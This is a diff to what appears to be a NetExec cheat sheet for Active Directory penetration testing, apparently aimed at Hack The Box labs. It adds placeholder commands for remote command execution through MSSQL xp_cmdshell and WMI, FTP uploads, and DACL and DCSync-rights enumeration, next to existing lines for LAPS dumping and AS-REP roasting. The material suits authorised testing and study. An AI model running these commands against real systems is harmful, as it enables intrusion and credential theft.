@@ -45,9 +45,9 @@ nxc smb <ip> -u '<username>' -p '<password>' -M spider_plus -o DOWNLOAD_FLAG=tru
 
 ## Working files on with SMB Shares
 
-# NetExec SMB Put file on remote
+# NetExec SMB Upload file on remote
 nxc smb <ip> -u '<username>' -p '<password>' --put-file <local-file> <remote-file>
-# NetExec SMB Get file from remote
+# NetExec SMB Download file from remote
 nxc smb <ip> -u '<username>' -p '<password>' --get-file <remote-file> <local-file>
 
 
@@ -126,9 +126,10 @@ nxc smb <ip> -u '<username>' -p '<password>' --groups
 nxc ftp <ip> -u '<username>' -p '<password>' --ls
 # List files on FTP server (specific path)
 nxc ftp <ip> -u '<username>' -p '<password>' --ls '<path>'
-# Get file from FTP server (specific path)
+# Download file from FTP server (specific path)
 nxc ftp <ip> -u '<username>' -p '<password>' --get '<file>'
-
+# Upload file from attacker to FTP server (specific path)
+nxc ftp <ip> -u '<username>' -p '<password>' --put <LOCAL_FILE> <REMOTE_FILE>
 
 # Asreproast- Get and try cracking user account hash
 nxc ldap <ip> -u '<username>' -p '' --asreproast asreproast.txt --kdcHost <ip>
@@ -176,6 +177,12 @@ nxc ldap <ip> -u '<username>' -p '<password>' --gmsa
 # Requirements: Domain Admins or user that have Read/WriteProperty to the ms-MCS-AdmPwd attribute
 nxc smb <ip> -u '<username>' -p '<password>' --laps    # add --lsa use the laps admin to dump lsa
 
+## Check for Spooler Service
+nxc smb <ip> -u '<username>' -p '<password>' -M spooler
+
+## Check for WebDav Service
+nxc smb <ip> -u '<username>' -p '<password>' -M webdav
+
 ## Azure - Entra Connect Sync service username looks like 'MSOL_16fb75d0227d'
 
 # Microsoft Online
@@ -186,7 +193,30 @@ nxc smb <ip> -u '<username>' -p '<password>' -M msol -o MSOL_PS1=C:\...\nxc\data
 
 ## mssql_priv
 
-# NetExec MsSQL
-nxc mssql <ip> -u '<username>' -p '<password>' -M mssql_priv
+# NetExec MsSQL (Check authentication)
+nxc mssql <ip> -u '<username>' -p '<password>' --local-auth --port 1434
 # NetExec MsSQL (privesc module)
 nxc mssql <ip> -u '<username>' -p '<password>' -M mssql_priv -o ACTION=privesc
+# NetExec MsSQL: Execute Windows Commands (xp_cmdshell)
+nxc mssql <ip> -u sa -p '<password>' --local-auth -x whoami
+# Execute MSSQL commands
+nxc mssql <ip> -u '<username>' -p '<password>' --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'
+
+
+## WMI
+
+# WMI: Execute Commands
+nxc wmi <ip> -u '<username>' -p '<password>' -x whoami
+
+
+## Read DACL Rights
+
+# Read all the ACEs of a user
+nxc ldap <dc-ip> -u '<username>' -p '<password>' --kdcHost <dc-ip> -M daclread -o TARGET=<username> ACTION=read
+# Read all rights PRINCIPAL user have on TARGET user
+nxc ldap <dc-ip> -u '<username>' -p '<password>' --kdcHost <dc-ip> -M daclread -o TARGET=<t_user> ACTION=read PRINCIPAL=<p_user>
+# Find users with DCSync rights on this domain
+nxc ldap <dc-ip> -u '<username>' -p '<password>' --kdcHost <dc-ip> -M daclread -o TARGET_DN="DC=htb,DC=LOCAL" ACTION=read RIGHTS=DCSync
+
+## Enumerate Domain Trusts
+nxc ldap <ip> -u '<username>' -p '<password>' -M enum_trusts
